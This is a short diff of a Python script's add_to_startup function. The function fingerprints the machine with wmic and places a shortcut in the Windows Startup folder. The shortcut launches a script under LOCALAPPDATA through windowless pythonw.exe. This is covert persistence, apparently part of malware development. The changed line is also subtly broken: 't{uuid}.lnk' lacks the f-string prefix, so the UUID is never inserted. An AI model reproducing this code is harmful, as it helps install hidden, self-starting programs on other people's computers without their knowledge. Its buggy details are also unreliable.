@@ -30,7 +30,7 @@ def add_to_startup():
     # Define paths
     uuid = subprocess.run("wmic csproduct get uuid", shell= True, capture_output= True).stdout.splitlines()[2].decode(errors= 'ignore').strip()
     startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-    path = os.path.join(startup_folder, "test.lnk")
+    path = os.path.join(startup_folder, "t{uuid}.lnk")
     target = sys.executable.replace("python.exe", "pythonw.exe")
     wDir = os.path.join(os.environ["LOCALAPPDATA"], "gd")
     script_path = os.path.join(wDir, "main.py")
